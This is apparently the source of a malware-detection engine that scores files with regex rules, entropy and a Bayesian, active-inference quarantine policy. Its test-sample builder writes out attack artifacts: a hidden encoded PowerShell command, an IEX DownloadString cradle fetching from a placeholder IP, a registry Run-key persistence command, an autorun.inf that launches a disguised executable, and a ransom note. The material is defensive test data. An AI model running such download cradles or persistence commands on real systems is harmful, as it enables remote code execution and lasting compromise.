// AISS detection engine: signatures, YARA-style rules, entropy, and an
// active-inference policy (variational free energy + expected free energy).

export type Sample = { name: string; content: string };
export type Detection = { rule: string; weight: number; detail: string };
export type Analysis = {
  name: string;
  sha256: string;
  size: number;
  entropy: number;
  detections: Detection[];
  pMalicious: number;
  freeEnergy: number;
  action: "allow" | "monitor" | "quarantine";
  efe: Record<string, number>;
  severity: "low" | "medium" | "high" | "critical";
};

// The industry-standard EICAR antivirus test signature (assembled at runtime
// so this source file itself is not flagged by scanners).
export const EICAR =
  ["X5O!P%@AP[4\\PZX54(P^)7CC)7}$", "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"].join("");

const RULES: { rule: string; weight: number; test: (s: Sample) => string | null }[] = [
  { rule: "SIG.EICAR_Test_File", weight: 1, test: (s) => (s.content.includes(EICAR) ? "EICAR signature matched" : null) },
  {
    rule: "USB.Autorun_Persistence",
    weight: 0.8,
    test: (s) => (/\[autorun\]/i.test(s.content) && /(open|shellexecute|shell\\)/i.test(s.content) ? "autorun.inf launches payload on mount" : null),
  },
  {
    rule: "PS.Encoded_Command",
    weight: 0.75,
    test: (s) => (/powershell[^\n]*(-enc|-encodedcommand)\s+[A-Za-z0-9+/=]{16,}/i.test(s.content) ? "Base64-encoded PowerShell command" : null),
  },
  {
    rule: "PS.Download_Cradle",
    weight: 0.7,
    test: (s) => (/(IEX|Invoke-Expression)[^\n]*(DownloadString|Net\.WebClient|iwr|Invoke-WebRequest)/i.test(s.content) ? "Remote download-and-execute cradle" : null),
  },
  {
    rule: "FILE.Double_Extension",
    weight: 0.6,
    test: (s) => (/\.(pdf|docx?|jpg|png|txt)\.(exe|scr|bat|cmd|js|vbs)$/i.test(s.name) ? `Masquerading extension: ${s.name}` : null),
  },
  { rule: "PE.Executable_Header", weight: 0.3, test: (s) => (s.content.startsWith("MZ") ? "Windows PE header (MZ)" : null) },
  {
    rule: "RANSOM.Note_Keywords",
    weight: 0.7,
    test: (s) => {
      const hits = ["your files have been encrypted", "bitcoin", "decrypt", "private key", "tor browser"].filter((k) => s.content.toLowerCase().includes(k));
      return hits.length >= 3 ? `Ransom note indicators: ${hits.join(", ")}` : null;
    },
  },
  {
    rule: "PERSIST.Registry_Run",
    weight: 0.55,
    test: (s) => (/CurrentVersion\\Run/i.test(s.content) ? "Registry Run-key persistence" : null),
  },
];

export function shannonEntropy(str: string) {
  if (!str.length) return 0;
  const freq = new Map<number, number>();
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i) & 0xff;
    freq.set(c, (freq.get(c) ?? 0) + 1);
  }
  let h = 0;
  for (const n of freq.values()) {
    const p = n / str.length;
    h -= p * Math.log2(p);
  }
  return h;
}

export async function sha256(str: string) {
  const bytes = new Uint8Array(str.length);
  for (let i = 0; i < str.length; i++) bytes[i] = str.charCodeAt(i) & 0xff;
  const buf = await crypto.subtle.digest("SHA-256", bytes);
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, "0")).join("");
}

// Generative model: Gaussian likelihoods of observed features under the
// hidden states {benign, malicious}. Prior belief: 2% of files malicious.
const PRIOR_MAL = 0.02;
const MODEL = {
  benign: { entropy: [4.6, 1.0] as [number, number], score: [0.05, 0.15] as [number, number] },
  malicious: { entropy: [6.4, 1.3] as [number, number], score: [0.9, 0.45] as [number, number] },
};
const lnN = (x: number, [m, s]: [number, number]) => -0.5 * Math.log(2 * Math.PI * s * s) - ((x - m) ** 2) / (2 * s * s);

export async function analyze(s: Sample): Promise<Analysis> {
  const detections: Detection[] = [];
  for (const r of RULES) {
    const d = r.test(s);
    if (d) detections.push({ rule: r.rule, weight: r.weight, detail: d });
  }
  const entropy = shannonEntropy(s.content);
  if (entropy > 7.2 && s.content.length > 512)
    detections.push({ rule: "HEUR.Packed_High_Entropy", weight: 0.5, detail: `Entropy ${entropy.toFixed(2)} bits/byte` });

  const score = Math.min(2, detections.reduce((a, d) => a + d.weight, 0));
  // Bayesian posterior over hidden state
  const lb = Math.log(1 - PRIOR_MAL) + lnN(entropy, MODEL.benign.entropy) + lnN(score, MODEL.benign.score);
  const lm = Math.log(PRIOR_MAL) + lnN(entropy, MODEL.malicious.entropy) + lnN(score, MODEL.malicious.score);
  const mx = Math.max(lb, lm);
  const evidence = mx + Math.log(Math.exp(lb - mx) + Math.exp(lm - mx));
  const pMal = Math.exp(lm - evidence);
  // Variational free energy at the exact posterior = surprise (-ln p(o))
  const freeEnergy = -evidence;

  // Expected free energy per policy = risk (cost of outcome under preferences) + ambiguity
  const ambiguity = -(pMal * Math.log(pMal + 1e-9) + (1 - pMal) * Math.log(1 - pMal + 1e-9));
  const efe = {
    allow: pMal * 10 + ambiguity,
    monitor: pMal * 4 + 0.6 + ambiguity * 0.5,
    quarantine: (1 - pMal) * 3 + 0.2,
  };
  const action = (Object.entries(efe).sort((a, b) => a[1] - b[1])[0]![0]) as Analysis["action"];
  const severity = pMal > 0.97 ? "critical" : pMal > 0.8 ? "high" : pMal > 0.4 ? "medium" : "low";

  return {
    name: s.name,
    sha256: await sha256(s.content),
    size: s.content.length,
    entropy,
    detections,
    pMalicious: pMal,
    freeEnergy,
    action,
    efe,
    severity,
  };
}

function randomBlob(n: number) {
  const b = new Uint8Array(n);
  crypto.getRandomValues(b);
  return String.fromCharCode(...b);
}

/** Builds the payload of a compromised USB stick (inert test artifacts). */
export function buildInfectedUsb(): Sample[] {
  const enc = btoa("Write-Host 'AISS test dropper'; Start-Sleep 1").replace(/=/g, "");
  return [
    { name: "autorun.inf", content: "[autorun]\nopen=Invoice_2026.pdf.exe\nshellexecute=Invoice_2026.pdf.exe\nicon=pdf.ico" },
    { name: "Invoice_2026.pdf.exe", content: "MZ" + "\x90\x00\x03" + EICAR + randomBlob(256) },
    { name: "update.ps1", content: `powershell -nop -w hidden -enc ${enc}AAAA\nIEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/s')\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd` },
    { name: "payload.bin", content: randomBlob(4096) },
    { name: "README_DECRYPT.txt", content: "Your files have been encrypted. Send 0.1 bitcoin. Use Tor Browser to obtain the private key and decrypt." },
    { name: "photos/holiday.jpg", content: "\xff\xd8\xff\xe0JFIF holiday photo data ".repeat(20) },
  ];
}
